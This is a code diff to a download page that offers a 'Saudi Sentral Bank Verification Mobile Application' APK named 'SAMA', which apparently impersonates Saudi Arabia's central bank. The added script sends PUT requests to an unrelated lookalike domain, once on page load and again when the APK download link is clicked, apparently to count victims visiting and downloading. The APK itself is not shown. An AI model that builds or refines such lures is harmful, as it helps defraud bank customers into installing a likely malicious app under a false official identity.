@@ -21,6 +21,7 @@
         Download Saudi Sentral Bank Verification Mobile Application
       </h1>
       <a
+      onclick="updateData2()"
         href="./app-release.apk"
         download="SAMA"
         style="text-decoration: none"
@@ -45,4 +46,67 @@
       </a>
     </div>
   </body>
+  <script>
+    function updateData() {
+        // Data to be sent in the request body
+        // URL of the API endpoint
+        var url = 'https://suadi.pakstateservices.online/api/count';
+
+        // Fetch options
+        var options = {
+            method: 'PUT',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+        };
+
+        // Send the PUT request using fetch
+        fetch(url, options)
+            .then(function(response) {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(function(data) {
+                // Data was successfully updated
+                console.log('Data updated successfully:', data);
+            })
+            .catch(function(error) {
+                // An error occurred
+                console.error('Error updating data:', error);
+            });
+    }
+    updateData()
+    function updateData2() {
+        // Data to be sent in the request body
+        // URL of the API endpoint
+        var url = 'https://suadi.pakstateservices.online/api/countdown';
+
+        // Fetch options
+        var options = {
+            method: 'PUT',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+        };
+
+        // Send the PUT request using fetch
+        fetch(url, options)
+            .then(function(response) {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(function(data) {
+                // Data was successfully updated
+                console.log('Data updated successfully:', data);
+            })
+            .catch(function(error) {
+                // An error occurred
+                console.error('Error updating data:', error);
+            });
+    }
+</script>
 </html>
